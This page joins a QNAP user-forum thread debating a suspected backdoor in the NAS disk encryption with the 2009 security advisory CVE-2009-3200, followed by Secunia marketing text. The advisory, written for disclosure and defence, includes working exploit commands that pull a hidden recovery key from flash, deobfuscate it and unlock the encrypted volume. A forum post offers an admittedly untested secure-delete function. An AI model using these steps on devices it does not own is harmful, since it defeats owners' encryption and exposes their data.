Thanks alienchaser,

these are good news for me. Maybe I will now buy a TS-809.

But maybe I still will build my own system because if a company build in such a backdoor who knows what else they have done.

That's alarming and untrustworthy!!

Hi

yours post seems to be very interesting for me. I have 219 with one of the oldest firmwares where QNAP guys were trying to use encryption with 219 product. Afterwards it occured that in business use encryption slows down too much 219 and they have decided to skip this feature with all newest firmwares.

This left me in a position when I must use the old, early beta firmware because I have both my disks encrypted. And I preffer slow encryption then none.

As you seems to have much more technical background with disk encryption then me, could you please advise how to change file for HDA and HDB disks? Yours script seems to be working for RAID configuration, yes?

I have two separate disks which are visible as HDA and HDB devices.

My idea is to copy data from disk one to disk two, reformat disk one without encryption, install new firmware and then use yours sctipt to mount encrypted disk two. Then I would have new firmware, one unencrypted disk (1) and one with most important data still encrypted. Is there any chance that I will need only cryptosetup file? I have it now in my sbin directory so I can copy it somewhere else, install new firmware and copy back. New firmware does not include it.

Any other files needed then cryptosetup executable?

Another question- is there any chance of use some kind of dummy partition? I mean feature like in TrueCrypt - that you dont have to encrypt whole drive, you can encrypt one file and use it as new encyrpted filesystem. With such possibility I would reuse a lot of space at drive1 still with encrytpion...

Hi raid4all,

Yes the communication of locking/unlocking the file system between the web interface and the NAS is encrypted using QNAP's implementation to prevent the case if anyone is scanning the data travels in between. Therefore the system only accepts the QNAP encrypted passphrase sent from the web admin backend.

Encryption with AES256 done right, using good keys is so secure there is NO reason what so ever not to explain. So I'd say they either know they have done something bad (like "protecting" the real symetric key with some weaker algorithm or perhaps they have a back door to "help" customers that has lost their key) or they don't know what they are doing so better not tell anyone. Having done some military grade work with encryption I know how easy you kan botch things up destroying the benefits from a good encryption algorithm.

Hi peris,

Thanks for your comments and regarding your concerns about the key management, both key slot 0/1 were created and encrypted using the passphrase you entered when setting things up and the the reason of having 2 key slots is because of the key management we use when user is changing the passphrase (slot 1) there must be at leat 1 key exists (key slot 0). There's no such back door you mentioned. And about your request of having an option for users to input/import their own AES key we are not considering this option and will announce once they are available.

I see... so basically You've traded providing a security function (scrambling the passphrase) against assurance (trust/proof that the security function really does what it is expected)?

You would rather not explain how this scrambling is done in detail, as that would make it easier for an attacker (because the method is not strong enough if it is explained)? And as a result you get questions on the implementation that you can't/won't answer?

Have you considered using (/requiring) HTTPS from the web interface? That should probably be a better/stronger way to prevent sniffing and not requiering "additional key management" (scrambling) that have assurance issues?´

Or perhaps including a checkbox to make additional password management (scrambling) optional (and thus avoiding tha assurance problem)?

Andy,

thank you very much for your explanations how AES encryption is implemented and how key management is done on QNAP devices respectively.

Now I can understand, why two keyslots are used.

Furthermore I hope, that there is a typo in
> And about your request of having an option for users to input/import their own AES key we are not considering this option and will announce once they are available.

I think this should mean "...we are **now** considering this option..."???? ![:?](./images/smilies/icon_confused.gif "Confused")

Maybe I'm just lost, but there is still something I can't understand.

As you explain, you are encrypting data between the web interface and the NAS to prevent scanning this communication.

Now, what I cant understand is how someone should scan this communication if not already logged onto the NAS?

If thats the case, we might have a bigger problem than a secure passphrase communication as this person could easily copy/delete all data on the NAS (if I assume that the encrypted filesystem is mounted)

I'm really looking forward for the implementation of the "use my own key" feature. This renders this hole secure communication thing needless (hopefully).

I would prefer if I can put my key on a USB Stick - either the stick is there at boot time or not and the encrypted filesytems gets mounted or not.

It seems to be a typo - see Andys post in:

But what "considering adding" really means in practical terms is still a question.

Also note my suggestion:

This has not yet been answered by QNAP - hopefully they are busy working on a "bring your own AES key" option as suggested.

No answer from QNAP yet - while we wait for a QNAP answer I'll give you my 25 cents on the subject (just ignore if not interested):

I think the threat QNAP is adressing is snooping the passphrase on the network when transported between the WEB UI and the NAS by an agressor not able to access/log in to the NAS. (Because - if you already has a trojan in the NAS or an agressor already is logged in to the NAS - as you indicated above - there is not much chance to prevent the agressor/trojan from reading the encrypted disk.) Network topology influenses how big problem network snooping is in practical terms, but cheap switches sometimes broadcast packets on all ports if overloaded/attacked.

The security function "disk encryption" (only) protects an un-mounted disk (for example a stolen NAS that is powered on). However - it is important to protect the "key" and all key management and user interaction handling the key's passphrase (protecting the security function - "encrypting the disk") so the "thief" can't steal the passphrase first (thus the key) and then steal the NAS. (Also important to protect the NAS from letting a agressor getting a bridgehead in it, but that is another topic).

Personally I think QNAP "scrambling" is the wrong way to adress network snooping concerns:

1) Instead - secure all communications with the NAS using standard protocols (HTTPS - easy to trust for users) or only when managing the key/passphrase.

2) The indicated method that QNAP uses seems to be close to "security by obscurity" - the added security depends on the agressor not knowing how it is implemented (a dangerous assumption).

Basically QNAP seems to think (or orginally have thought) that the added protection against network snooping (of the passphrase) by "scrambling" (mandatory added key management) is more important than assurance and ability to use both web interface and command line to handle luks.

I think not.

The security function "encrypting disk (using AES256)" strength of mechanism is somewhat let down by QNAP current handling of the key:

a) (significant problem) a unprotected/or weakly protected (only scrambled) channel from the web-interface is used when managing the key passphrase (much weaker than the rest of the functionality for the disk encryption)

b) ("minor" problem) the stored symmetric key is protected by a asymmetric mechanism. That is weaker than not storing the AES256 on disk but probably OK for business/home use (standard luks) if implemented in a clean way without assurance problems.

c) (big problem) assurance is important (do not comprimise assurance for a small increase in security function). What proof has QNAP that they have not implemented a backdoor even when they say they have not? We must trust their statement on the basis that they are good guys and haven't been forced by possible government mandates to provide a backdoor. See how quickly discussions got started in this thread - when the additional key management and dual slots was discovered.

QNAP now seems to (correctly) have found that - providing a "bring your own AES key" option (as requested) handles both the assurance problem and the strength of mechanism issues.

Hi guys,

I am a newly Qnap owner, specifically the TS-239 Pro.

As I am using the encryption feature and I am also a security guy, I started to reverse engineer the qnap encryption implementation to ensure that the security is fine.

I have no clue why they make a big secret of how it works. its actually simple.

**sorry guys, this post included wrong information. please read the new post below**

**issue 1 - minor:** A good way to generate random data is to use collect some time, mac, ip address, source port of the http connection to the web gui, etc., concatinating that and running it through SHA1-256. This is then a secure enough seeding of the random number generator which is to be used. then generate random data, but before this is used, run it again through e.g. SHA1-256. And the result of that hashing is then the key to be used.

**issue 2 - major:** After cryptsetup was called (or an error occured beforehand) the files are deleted ... by calling unlink(). This is bad. by debugging the filesystem or using forensic tools (e.g. coroners toolkit, autopsy/sleuthkit, etc.) it is possible to recover the files in /tmp/ and by that gain access to the encrypted filesystems!

This is a serious security issue.

And the solution so simple:

before unlinking, just do a \_secure\_delete(FILENAME)

and here is an example function:

void \_secure\_delete(char \*filename) {

int fd;

char buf[128];

fd = open(filename, O\_RDWR | O\_SYNC);

memset(buf, 0, 128);

write(fd, buf, sizeof(buf));

fsync(fd);

close(fd);

sync()

fd = open(filename, O\_RDWR | O\_TRUNC | O\_SYNC);

fsync(fd);

close(fd);

sync();

/\* unlink(filename); // do it here or afterwards ... \*/

}

it just overwrites the first 128 bytes with null-bytes which is enough for this special application in a secure way.

ah, and I just coded it down from mind, so it might not compile directly for one reason or another ![;-)](./images/smilies/icon_wink.gif "Wink")

I sent the issue of course to the customer support and got this reply:
> Good day, Thank you for your suggestion for our product.
>
> We will plan to impprove the security of the implementation in next version.

so when the next version is out I will check the implementation again.

Yes, you can even configure what port it listens on. Doesn't void the warranty. Login is admin only, unless you replace it with OpenSSH (search this forum on how to replace)

> If that is the case the strenght of the mechanism (for confidentialiy) is much much lower than it should be and below what you can create with freeNAS-type of distributions if you know what you are doing. One problem is that the asymmetric passphrase-unlock mechanism is weaker than the symmetric AES algorithm (weakest link in the chain decides the strenght of the chain). But the big problem in this approach is that you might for example have added a separate backdoor passphrase that your tech support can use to unlock customer disks if we forget the passphrase. I do understand the need for such a mode of operation, but please understand that backdoors (if present) always leak (and for people that actually are interested in using encryption there is no way we can trust a implementation that allows for back-doors).

No, there's no such back door you mentioned.

Should be really easy to implment (mostly just sidestepping the passphrase part thus avoiding weaking the mechanism).

Yes, we are now considering adding this option for users to input their own AES256 key themselves. Details will be anounced once they are available.

See my other replies for your other concerns regarding to the disk encryption feature.

Thanks for answering.

Looking forward to a "bring your own AES key" option.

You also might consider having an option to get the AES key generated, but omitting the extra key management and thus beeing able to manage luks from the command-line and avoid assurance issues.

Title: Crypto backdoor in Qnap storage devices
Date: 18 September 2009
URL: http://www.mh-sec.de/downloads/BSC-Qnap\_Crypto\_Backdoor-CVE-2009-3200.txt
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Vendor: QNAP Systems
Affected Products: TS-239 Pro, TS-639 Pro, SS-439 Pro, TS-439 Pro,
TS-439U-SP/RP, TS-509 Pro, SS-839 Pro,
TS-809 Pro, TS-809U-RP
Vulnerability: hard disk encryption bypass due recovery key
Affected Releases: All previous to v3.1.2 Build1001
Severity: Moderate/High
CVE: CVE-2009-3200
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Update Section:
02 November 2009
Stable firmware update v3.1.2 Build1014 from 23 October 2009
does remove the backdoor key when installed. However the
offending code is still in the binaries. Due time constraints
this can not be followed up at the moment.
25 September 2009
Fixed an error in the "Exploit:" section, which made the key
wrong, and the exploit would not work.
23 September 2009
For the two minor issues in the advisory, MITRE created two
additional CVEs: CVE-2009-3278 and CVE-2009-3279
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Overview:
The premium and new line of QNAP network storage solutions allow
for full hard disk encryption. When rebooting, the user has to
unlock the hard disk by supplying the encryption passphrase via
the web GUI.
However, when the hard disk is encrypted, a secondary key is
created, added to the keyring, and stored in the flash with minor
obfuscation.
Impact:
The encrypted hard disk can be unlocked and potential sensitive
contents access by attackers who obtain physical or network
access to the hard disk and flash.
Description:
When a user selects in the web GUI to encrypt a hard drive, he
has to supply a passphrase of 8-16 length.
The Qnap solution is to use the underlying Linux standard
mechanisms of LUKS to create the encrypted partition.
The user supplied passphrase is crypt(3)'ed with the MD5 salt
of $1$YCCaQNAP$ and used as the initial key to access the LUKS
master key for the drive.
Additionally, the system creates a second key, which is 32
characters long and contains all low case characters and the
numbers 0-9, and adds it to the LUKS keyring:
/sbin/cryptsetup luksAddKey /dev/md0 /tmp/temp.wLbZNp \
--key-file=/tmp/temp.rUBxFo
Before writing the second key to the flash, the key is then
obfuscated in the following way:
the first six characters are reversed and written to the end
of the string.
The obfuscated string is then written to the flash (/dev/sdx6
on current Qnap storage devices) in the ENCK variable.
Exploit:
An attacker - or user who has lost his passphrase - just needs
to do the following:
1. Obtain the backdoor key from the flash:
# strings /dev/sdx6 | grep ENCK
ENCK=ijklmnopqrstuvwxyz012345hgfedcba
It is possible that several ENCK keys show up.
2. The key has then to be deobfuscated. The last 6 characters have
to be taken, reversed, and put in front of the string:
ENCK key before: ijklmnopqrstuvwxyz012345hgfedcba
ENCK key after: abcdefghijklmnopqrstuvwxyz012345
3. The key file has to be created:
# echo -n "abcdefghijklmnopqrstuvwxyz012345" > /tmp/key
4. The encrypted volume is unlocked and mounted. The device is
usually /dev/md0 or /dev/sda3.
# /sbin/cryptsetup luksOpen /dev/md0 md0 --key-file=/tmp/key
key slot 0 unlocked.
Command successful.
# mount /dev/mapper/md0 /share/MD0\_DATA
Full access to the encrypted volume has been obtained.
Additional Weaknesses:
The backdoor key is generated by rand() calls. As the rand()
function produces random numbers unsuitable for cryptographic
keys. The cryptographic strength of this generated key is
approx 2^32, hence feasible for breaking. This would make
access to the flash unnecessary.
The LUKS partition is created in AES-256 in plain CBC mode. This
mode is susceptible to watermark attacks.
Solution:
Firmware update v3.1.2 Build1014 from 23 October 2009 removes
the backdoor key from the crypto volume and the flash.
A quick analysis of the update showed that offending code is
still present. No time is currently available to see what
changes have been made to the code to not use the offending
backdoor code.
Note that the removal of the backdoor was labeled as
"Provide Enhanced AES-256 encryption in data security"
in the change notes...
Workaround:
There is no workaround available which can be used by a novice
user.
The best solution is to remove the backdoor key from keyslot 0.
However this requires hashing the user passphrase. For this, a
Linux system has to be available, which has the "mkpasswd" command
installed (whois package).
Execute:
# mkpasswd --hash=md5 --salt='YCCaQNAP'
and enter the password on the Password: prompt. Copy the outout.
On the Qnap device, create the keyfile with the password hash:
# echo -n "...the output of mkpasswd..." > /tmp/mykey
Now remove the backdoor key:
# /sbin/cryptsetup luksKillSlot /dev/md0 0 --key-file=/tmp/mykey
Remove all sensitive data, wipe the shell history, and logoff:
# echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaa" > /tmp/mykey
# rm /tmp/mykey /tmp/key
# HISTSIZE=0
# exit
As an additional measure, the flash can be edited and the saved
key overwritten (this requires the ipkg package installed).
Install a hex editor, run the hexeditor on the flash, and
overwrite ENCK values:
# ipkg install hexcurse
# hexcurse /dev/sdx6
(a hex editor window is loading)
Type Control-F, then 454e434b and hit Enter.
Use the cursor keys to the character string after the "ENCK="
string and then type in as many "A" characters, until the string
is full. Type Control-S to save, adn Control-Q to quit.
Please note that no liability is given whatsoever by anyone
if the workaround is used. It is recommended to be performed
by experienced users only.
Original Vendor FUD:
"The functionality for encryption the hard disk does not include
a crypto backdoor."
(in response to a user question why two keyslots are allocated,
and if this is because of a backdoor)

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
